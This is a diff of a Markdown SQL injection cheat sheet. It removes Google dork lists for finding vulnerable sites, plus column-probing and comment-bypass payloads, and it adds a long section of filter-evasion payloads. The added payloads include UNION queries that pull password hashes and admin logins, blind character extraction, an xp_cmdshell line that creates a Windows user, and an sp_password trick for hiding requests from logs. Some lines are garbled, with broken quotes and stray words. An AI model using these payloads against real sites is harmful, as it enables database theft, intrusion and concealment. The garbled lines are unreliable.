@@ -21,16 +21,9 @@ series = ["web"]
     * [Oracle (1521)](#oracle-1521)
     * [PostgresSQL (5432)](#postgressql-5432)
 * [SQL Injection](#sql-injection)
-    * [Google Dorking](#google-dorking)
     * [Bad character detect](#bad-character-detect)
-    * [Detect number of vulnerable columns](#detect-number-of-vulnerable-columns)
-    * [Union Select](#union-select)
-    * [bypass usando comentarios](#bypass-usando-comentarios)
-    * [bypass usando comentarios and url encoding](#bypass-usando-comentarios-and-url-encoding)
-    * [Information_schema.tables bypass](#information_schema.tables-bypass)
-    * [concat](#concat)
-    * [group_concat](#group_concat)
     * [Authen bypass](#authen-bypass)
+    * [Sql injection bypass filter](#sql-injection-bypass-filter)
 * [SQLMAP](#sqlmap)
 * [Reference](#reference)
 # General
@@ -156,117 +149,6 @@ copy myfile from '/etc/passwd';
 select * from myfile;copy myfile to /tmp/test;
 ```
 # SQL Injection
-### Google Dorking
-```bash
-inurl:"id=" & intext:"Warning: mysql_fetch_assoc()"
-inurl:"id=" & intext:"Warning: mysql_fetch_array()"
-inurl:"id=" & intext:"Warning: mysql_num_rows()"
-inurl:"id=" & intext:"Warning: session_start()"
-inurl:"id=" & intext:"Warning: getimagesize()"
-inurl:"id=" & intext:"Warning: is_writable()"
-inurl:"id=" & intext:"Warning: getimagesize()"
-inurl:"id=" & intext:"Warning: Unknown()"
-inurl:"id=" & intext:"Warning: session_start()"
-inurl:"id=" & intext:"Warning: mysql_result()"
-inurl:"id=" & intext:"Warning: pg_exec()"
-inurl:"id=" & intext:"Warning: mysql_result()"
-inurl:"id=" & intext:"Warning: mysql_num_rows()"
-inurl:"id=" & intext:"Warning: mysql_query()"
-inurl:"id=" & intext:"Warning: array_merge()"
-inurl:"id=" & intext:"Warning: preg_match()"
-inurl:"id=" & intext:"Warning: ilesize()"
-inurl:"id=" & intext:"Warning: filesize()"
-inurl:"id=" & intext:"Warning: filesize()"
-inurl:"id=" & intext:"Warning: require()
-inurl:aboutbook.php?id=
-inurl:review.php?id=
-inurl:loadpsb.php?id=
-inurl:ages.php?id=
-inurl:material.php?id=
-inurl:clanek.php4?id=
-inurl:announce.php?id=
-inurl:chappies.php?id=
-inurl:read.php?id=
-inurl:viewapp.php?id=
-inurl:viewphoto.php?id=
-inurl:rub.php?idr=
-inurl:galeri_info.php?l=
-inurl:review.php?id=
-inurl:iniziativa.php?in=
-inurl:curriculum.php?id=
-inurl:labels.php?id=
-inurl:story.php?id=
-inurl:look.php?ID=
-inurl:newsone.php?id=
-inurl:aboutbook.php?id=
-inurl:material.php?id=
-inurlpinions.php?id=
-inurl:announce.php?id=
-inurl:rub.php?idr=
-inurl:galeri_info.php?l=
-inurl:tekst.php?idt=
-inurl:event.php?id=
-inurlroduct-item.php?id=
-inurl:sql.php?id=
-inurl:news_view.php?id=
-inurl:select_biblio.php?id=
-inurl:humor.php?id=
-inurl:aboutbook.php?id=
-inurl:fiche_spectacle.php?id=
-inurl:view_items.php?id= 
-inurl:home.php?cat= 
-inurl:item_book.php?CAT= 
-inurl:www/index.php?page= 
-inurl:schule/termine.php?view= 
-inurl:goods_detail.php?data= 
-inurl:storemanager/contents/item.php?page_code= 
-inurl:view_items.php?id= 
-inurl:customer/board.htm?mode= 
-inurl:help/com_view.html?code= 
-inurl:n_replyboard.php?typeboard= 
-inurl:eng_board/view.php?T****= 
-inurl:prev_results.php?prodID= 
-inurl:bbs/view.php?no= 
-inurl:gnu/?doc= 
-inurl:zb/view.php?uid= 
-inurl:global/product/product.php?gubun= 
-inurl:m_view.php?ps_db= 
-inurl:productlist.php?tid= 
-inurl:product-list.php?id= 
-inurl:onlinesales/product.php?product_id= 
-inurl:garden_equipment/Fruit-Cage/product.php?pr= 
-inurl:product.php?shopprodid= 
-inurl:product_info.php?products_id= 
-inurl:productlist.php?tid= 
-inurl:showsub.php?id= 
-inurl:productlist.php?fid= 
-inurl:products.php?cat= 
-inurl:products.php?cat= 
-inurl:product-list.php?id= 
-inurl:product.php?sku= 
-inurl:store/product.php?productid= 
-inurl:products.php?cat= 
-inurl:productList.php?cat= 
-inurl:product_detail.php?product_id= 
-inurl:product.php?pid= 
-inurl:view_items.php?id= 
-inurl:more_details.php?id= 
-inurl:county-facts/diary/vcsgen.php?id= 
-inurl:idlechat/message.php?id= 
-inurl:podcast/item.php?pid= 
-inurl:products.php?act= 
-inurl:details.php?prodId= 
-inurl:socsci/events/full_details.php?id= 
-inurl:ourblog.php?categoryid= 
-inurl:mall/more.php?ProdID= 
-inurl:archive/get.php?message_id= 
-inurl:review/review_form.php?item_id= 
-inurl:english/publicproducts.php?groupid= 
-inurl:news_and_notices.php?news_id= 
-inurl:rounds-detail.php?id=
-sqlmap.py -g "DOKR"
-sqlmap.py -g "inurl:\".php?id=1\""
-```
 ### Bad character detect
 ```bash
 '
@@ -344,171 +226,6 @@ AND false
 /?q=1' or '1'='1
 /?q=1 or 1=1
 /?q='or''='
-```
-### Detect number of vulnerable columns
-```bash
-ORDER BY 1-- 
-ORDER BY 2-- 
-ORDER BY 3-- 
-ORDER BY 4-- 
-ORDER BY 5-- 
-ORDER BY 6-- 
-ORDER BY 7-- 
-ORDER BY 8-- 
-ORDER BY 9-- 
-ORDER BY 10-- 
-
-ORDER BY 1# 
-ORDER BY 2# 
-ORDER BY 3# 
-ORDER BY 4# 
-ORDER BY 5# 
-ORDER BY 6# 
-ORDER BY 7# 
-ORDER BY 8# 
-ORDER BY 9# 
-ORDER BY 10#
-```
-
-### Union Select
-```bash
-UNION SELECT 1
-UNION SELECT 1,2
-UNION SELECT 1,2,3
-UNION SELECT 1,2,3,4
-UNION SELECT 1,2,3,4,5
-UNION SELECT 1,2,3,4,5,6
-UNION SELECT 1,2,3,4,5,6,7
-UNION ALL SELECT 1
-UNION ALL SELECT 1,2
-UNION ALL SELECT 1,2,3
-UNION ALL SELECT 1,2,3,4
-UNION ALL SELECT 1,2,3,4,5
-UNION ALL SELECT 1,2,3,4,5,6
-UNION ALL SELECT 1,2,3,4,5,6,7
-
-UNION(SELECT 1)
-UNION(SELECT 1,2)
-UNION(SELECT 1,2,3)
-UNION(SELECT 1,2,3,4)
-UNION(SELECT 1,2,3,4,5)
-UNION(SELECT 1,2,3,4,5,6)
-UNION(SELECT 1,2,3,4,5,6,7)
-
-UNION ALL(SELECT 1)
-UNION ALL(SELECT 1,2)
-UNION ALL(SELECT 1,2,3)
-UNION ALL(SELECT 1,2,3,4)
-UNION ALL(SELECT 1,2,3,4,5)
-UNION ALL(SELECT 1,2,3,4,5,6)
-UNION ALL(SELECT 1,2,3,4,5,6,7)
-
-AND 1 UNION SELECT 1
-AND 1 UNION SELECT 1,2
-AND 1 UNION SELECT 1,2,3
-AND 1 UNION SELECT 1,2,3,4
-AND 1 UNION SELECT 1,2,3,4,5
-AND 1 UNION SELECT 1,2,3,4,5,6
-AND 1 UNION SELECT 1,2,3,4,5,6,7
-NION DISTINCTROW SELECT 1
-UNION DISTINCTROW SELECT 1,2
-UNION DISTINCTROW SELECT 1,2,3
-UNION DISTINCTROW SELECT 1,2,3,4
-UNION DISTINCTROW SELECT 1,2,3,4,5
-UNION DISTINCTROW SELECT 1,2,3,4,5,6
-```
-
-### bypass usando comentarios
-```bash
-/*!UNION*/ /*!SELECT*/ 1
-/*!UNION*/ /*!SELECT*/ 1,2
-/*!UNION*/ /*!SELECT*/ 1,2,3
-/*!UNION*/ /*!SELECT*/ 1,2,3,4
-/*!UNION*/ /*!SELECT*/ 1,2,3,4,5
-/*!UNION*/ /*!SELECT*/ 1,2,3,4,5,6
-/*!UNION*/ /*!SELECT*/ 1,2,3,4,5,6,7
-
-/*!12345UNION*/ /*!12345SELECT*/ 1
-/*!12345UNION*/ /*!12345SELECT*/ 1,2
-/*!12345UNION*/ /*!12345SELECT*/ 1,2,3
-/*!12345UNION*/ /*!12345SELECT*/ 1,2,3,4
-/*!12345UNION*/ /*!12345SELECT*/ 1,2,3,4,5
-/*!12345UNION*/ /*!12345SELECT*/ 1,2,3,4,5,6
-/*!12345UNION*/ /*!12345SELECT*/ 1,2,3,4,5,6,7
-
-/*!12345UNION*/(/*!12345SELECT*/ 1)
-/*!12345UNION*/(/*!12345SELECT*/ 1,2)
-/*!12345UNION*/(/*!12345SELECT*/ 1,2,3)
-/*!12345UNION*/(/*!12345SELECT*/ 1,2,3,4)
-/*!12345UNION*/(/*!12345SELECT*/ 1,2,3,4,5)
-/*!12345UNION*/(/*!12345SELECT*/ 1,2,3,4,5,6)
-/*!12345UNION*/(/*!12345SELECT*/ 1,2,3,4,5,6,7)
-```
-
-### bypass usando comentarios and url encoding
-```bash
-/*!%55nion*/%20/*!%53elect*/1
-/*!%55nion*/%20/*!%53elect*/%201,2
-/*!%55nion*/%20/*!%53elect*/%201,2,3
-/*!%55nion*/%20/*!%53elect*/%201,2,3,4
-/*!%55nion*/%20/*!%53elect*/%201,2,3,4,5
-/*!%55nion*/%20/*!%53elect*/%201,2,3,4,5,6
-/*!%55nion*/%20/*!%53elect*/%201,2,3,4,5,6,7
-
-/*!12345%55nion*/ /*!12345%53elect*/ 1
-/*!12345%55nion*/ /*!12345%53elect*/ 1,2
-/*!1234%55nion*/ /*!12345%53elect*/ 1,2,3
-/*!12345%55nion*/ /*!12345%53elect*/ 1,2,3,4
-/*!12345%55nion*/ /*!12345%53elect*/ 1,2,3,4,5
-/*!12345%55nion*/ /*!12345%53elect*/ 1,2,3,4,5,6
-/*!12345%55nion*/ /*!12345%53elect*/ 1,2,3,4,5,6,7
-
-/*!12345%55nion*/(/*!12345%53elect*/ 1)
-/*!12345%55nion*/(/*!12345%53elect*/ 1,2)
-/*!12345%55nion*/(/*!12345%53elect*/ 1,2,3)
-/*!12345%55nion*/(/*!12345%53elect*/ 1,2,3,4)
-/*!12345%55nion*/(/*!12345%53elect*/ 1,2,3,4,5)
-/*!12345%55nion*/(/*!12345%53elect*/ 1,2,3,4,5,6)
-/*!12345%55nion*/(/*!12345%53elect*/ 1,2,3,4,5,6,7)
-```
-
-### Information_schema.tables bypass
-```bash
-/*!froM*/ /*!InfORmaTion_scHema*/.tAblES /*!WhERe*/ /*!TaBle_ScHEmA*/=schEMA()-- -
-/*!froM*/ /*!InfORmaTion_scHema*/.tAblES /*!WhERe*/ /*!TaBle_ScHEmA*/ like schEMA()-- -
-/*!froM*/ /*!InfORmaTion_scHema*/.tAblES /*!WhERe*/ /*!TaBle_ScHEmA*/=database()-- -
-/*!froM*/ /*!InfORmaTion_scHema*/.tAblES /*!WhERe*/ /*!TaBle_ScHEmA*/ like database()-- -
-/*!FrOm*/+%69nformation_schema./**/columns+/*!50000Where*/+/*!%54able_name*/=hex table
-/*!FrOm*/+information_schema./**/columns+/*!12345Where*/+/*!%54able_name*/ like hex table
-```
-### Concat
-```bash
-CoNcAt()
-concat() 
-CON%08CAT()
-CoNcAt()
-%0AcOnCat()
-/**//*!12345cOnCat*/
-/*!50000cOnCat*/(/*!*/)
-unhex(hex(concat(table_name)))
-unhex(hex(/*!12345concat*/(table_name)))
-unhex(hex(/*!50000concat*/(table_name)))
-```
-### group_concat
-```bash
-/*!group_concat*/()
-gRoUp_cOnCAt()
-group_concat(/*!*/)
-group_concat(/*!12345table_name*/)
-group_concat(/*!50000table_name*/)
-/*!group_concat*/(/*!12345table_name*/)
-/*!group_concat*/(/*!50000table_name*/)
-/*!12345group_concat*/(/*!12345table_name*/)
-/*!50000group_concat*/(/*!50000table_name*/)
-/*!GrOuP_ConCaT*/()
-/*!12345GroUP_ConCat*/()
-/*!50000gRouP_cOnCaT*/()
-/*!50000Gr%6fuP_c%6fnCAT*/()
 ```
 ### Authen bypass
 ```bash
@@ -710,6 +427,188 @@ admin' and substring(password/text(),1,1)='7
 ' and substring(password/text(),1,1)='7
 ' or 1=1 limit 1 -- -+
 '="or'
+```
+### SQL injection bypass filter
+```sql
+ # Comments
+' or 1=1#
+' or 1=1/* (MySQL < 5.1)
+' or 1=1;%00
+' or 1=1 union select 1,2 as `
+' or#newline
+' /*!50000or*/1='1
+' /*!or*/1='1'
+ # Prefix
++ – ~ !
+' or –+2=- -!!!'2
+ # Operator:
+^, =, !=, %, /, *, &, &&, |, ||, , >>, <=, <=, ,, XOR, DIV, LIKE, SOUNDS LIKE, RLIKE, REGEXP, LEAST, GREATEST, CAST, CONVERT, IS, IN, NOT, MATCH, AND, OR, BINARY, BETWEEN, ISNULL
+ # Spaces
+%20 %09 %0a %0b %0c %0d %a0 /**/
+'or+(1)sounds/**/like"1"–%a0-
+'union(select(1),tabe_name,(3)from`information_schema`.`tables`)#
+ # A quoted string
+SELECT 'a'
+SELECT "a"
+SELECT n'a'
+SELECT b'1100001′
+SELECT _binary'1100001′
+SELECT x'61'
+ 
+ # Unquoted string
+'abc' = 0×616263
+and substr(data,1,1) = 'a'#
+and substr(data,1,1) = 0x61 # 0x6162
+and substr(data,1,1) = unhex(61)    # unhex(6162)
+and substr(data,1,1) = char(97  )# char(97,98)
+and substr(data,1,1) = 'a'#
+and hex(substr(data,1,1)) = 61#
+and ascii(substr(data,1,1)) = 97#
+and ord(substr(data,1,1)) = 97# 
+and substr(data,1,1) = lower(conv(10,10,36))# 'a'
+ # Alias
+select pass as alias from users
+select pass`alias alias`from users
+```
+```sql
+# Font
+' or true = '1 # or 1
+'' or round(pi(),1)+true+true = version() # or 3.1+1+1 = 5.1
+' or '1 # or true
+ # Operator fonts
+select * from users where 'a'='b'='c'
+select * from users where ('a'='b')='c'
+select * from users where (false)='c'
+ # Seriously bypass the '='
+select * from users where name = "="
+select * from users where false = ""
+select * from users where 0 = 0
+ select * from users where true # filter function ascii (97)
+load_file/*foo*/(0×616263)
+ Construction # string functions
+'abc' = unhex(616263)
+'abc' = char(97,98,99)
+ hex('a') = 61
+ ascii('a') = 97
+ ord('a') = 97
+'ABC' = concat(conv(10,10,36),conv(11,10,36),conv(12,10,36))
+ # Extracted substring substr ( 'abc', 1,1) = 'a'
+substr('abc' from 1 for 1) = 'a'
+substring('abc',1,1) = 'a'
+substring('abc' from 1 for 1) = 'a'
+mid('abc',1,1) = 'a'
+mid('abc' from 1 for 1) = 'a'
+lpad('abc',1,space(1)) = 'a'
+rpad('abc',1,space(1)) = 'a'
+left('abc',1) = 'a'
+reverse(right(reverse('abc'),1)) = 'a'
+insert(insert('abc',1,0,space(0)),2,222,space(0)) = 'a'
+space(0) = trim(version()from(version()))
+ # Substring search
+locate('a','abc')
+position('a','abc')
+position('a' IN 'abc')
+instr('abc','a')
+substring_index('ab','b',1)
+Split string #
+length(trim(leading 'a' FROM 'abc'))
+length(replace('abc', 'a', "))
+```
+```sql
+ # String comparison
+strcmp('a','a')
+mod('a','a')
+find_in_set('a','a')
+field('a','a')
+count(concat('a','a'))
+ 
+ # String length
+length()
+bit_length()
+char_length()
+octet_length()
+bit_count()
+ 
+ # Keyword filter
+Connected keyword filtering
+(0)union(select(table_name),column_name,…
+0/**/union/*!50000select*/table_name`foo`/**/…
+0%a0union%a0select%09group_concat(table_name)….
+0′union all select all`table_name`foo from`information_schema`. `tables`
+ 
+ # Flow control
+case 'a' when 'a' then 1 [else 0] end
+case when 'a'='a' then 1 [else 0] end
+if('a'='a',1,0)
+ifnull(nullif('a','a'),1)
+ d) a test vector
+%55nion(%53elect 1,2,3)-- -
+ 
++union+distinctROW+select+
+/**//*!12345UNION SELECT*//**/
+/**/UNION/**//*!50000SELECT*//**/
+/*!50000UniON SeLeCt*/
++#uNiOn+#sEleCt
++#1q%0AuNiOn all#qa%0A#%0AsEleCt
+/*!u%6eion*/ /*!se%6cect*/
++un/**/ion+se/**/lect
+uni%0bon+se%0blect
+%2f**%2funion%2f**%2fselect
+union%23foo*%2F*bar%0D%0Aselect%23foo%0D%0A
+REVERSE(noinu)+REVERSE(tceles)
+/*--*/union/*--*/select/*--*/
+union (/*!/**/ SeleCT */ 1,2,3)
+/*!union*/+/*!select*/
+union+/*!select*/
+/**//*!union*//**//*!select*//**/
+/*!uNIOn*/ /*!SelECt*/
++union+distinctROW+select+
+-15+(uNioN)+(sElECt)
+-15+(UnI)(oN)+(SeL)(ecT)+
+ 
+id=1+UnIOn/**/SeLect 1,2,3—
+id=1+UNIunionON+SELselectECT 1,2,3—
+id=1+/*!UnIOn*/+/*!sElEcT*/ 1,2,3—
+id=1 and (select 1)=(Select 0xAA 1000 more A’s)+UnIoN+SeLeCT 1,2,3—
+id=1+un/**/ion+sel/**/ect+1,2,3--
+id=1+/**//*U*//*n*//*I*//*o*//*N*//*S*//*e*//*L*//*e*//*c*//*T*/1,2,3
+id=1+/**/union/*&id=*/select/*&id=*/column/*&id=*/from/*&id=*/table--
+id=1+/**/union/*&id=*/select/*&id=*/1,2,3--
+id=-1 and (select 1)=(Select 0xAA*1000) /*!UNION*/ /*!SELECT*//**/1,2,3,4,5,6—x
+ 
+/**/union/*&id=*/select/*&id=*/column/*&id=*/from/*&id=*/table--
+/*!union*/+/*!select*/+1,2,3—
+/*!UnIOn*//*!SeLect*/+1,2,3—
+un/**/ion+sel/**/ect+1,2,3—
+/**//*U*//*n*//*I*//*o*//*N*//*S*//*e*//*L*//*e*//*c*//*T*/1,2,3—
+ID=66+UnIoN+aLL+SeLeCt+1,2,3,4,5,6,7,(SELECT+concat(0x3a,id,0x3a,password,0x3a)+FROM+information_schema.columns+WHERE+table_schema=0x6334706F645F666573746976616C5F636D73+AND+table_name=0x7573657273),9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30--
+ 
+?id=1+and+ascii(lower(mid((select+pwd+from+users+limit+1,1),1,1)))=74
+index.php?uid=strcmp(left((select+hash+from+users+limit+0,1),1),0x42)+123
+?page_id=null%0A/**//*!50000%55nIOn*//*yoyu*/all/**/%0A/*!%53eLEct*/%0A/*nnaa*/+1,2,
+?id=15+/*!UnIoN*/+/*!aLl*/+/*!SeLeCt*/+1,version(),3,4,5,6,7--
+id=1/*!limit+0+union+select+concat_ws(0×3a,table_name,column_name)+from+information_schema.columns*/
+ 
+id=-725+/*!UNION*/+/*!SELECT*/+1,GrOUp_COnCaT(TABLE_NAME),3,4,5+FROM+/*!INFORMATION_SCHEM*/.TABLES-- 
+id=-725+/*!UNION*/+/*!SELECT*/+1,GrOUp_COnCaT(COLUMN_NAME),3,4,5+FROM+/*!INFORMATION_SCHEM*/.COLUMNS+WHERE+TABLE_NAME=0x41646d696e--
+ 
+SELECT*FROM(test)WHERE(name)IN(_ucs2 0x01df010e004d00cf0148);
+SELECT(extractvalue(0x3C613E61646D696E3C2F613E,0x2f61)) in xml way
+ 
+select user from mysql.user where user = 'user' OR mid(password,1,1)=unhex('2a')
+select user from mysql.user where user = 'user' OR mid(password,1,1) regexp '[*]'
+select user from mysql.user where user = 'user' OR mid(password,1,1) like '*'
+select user from mysql.user where user = 'user' OR mid(password,1,1) rlike '[*]'
+select user from mysql.user where user = 'user' OR ord(mid(password,1,1))=42
+ 
+/?id=1+union+(select'1',concat(login,hash)from+users)
+/?id=(1)union(((((((select(1),hex(hash)from(users))))))))
+ 
+?id=1'; /*&id=1*/ EXEC /*&id=1*/ master..xp_cmdshell /*&id=1*/ net user lucifer UrWaFisShiT /*&id=1*/ --
+id=10 a%nd 1=0/(se%lect top 1 ta%ble_name fr%om info%rmation_schema.tables)
+id=10 and 1=0/(select top 1 table_name from information_schema.tables)
+id=-725+UNION+SELECT+1,GROUP_CONCAT(id,0x3a,login,0x3a,password,0x3a,email,0x3a,access_level),3,4,5+FROM+Admin--
+id = -725 + UNION + SELECT + 1, version (), 3,4,5 - sp_password // use request of log hidden sp_password
 ```
 # SQLMAP
 ```bash
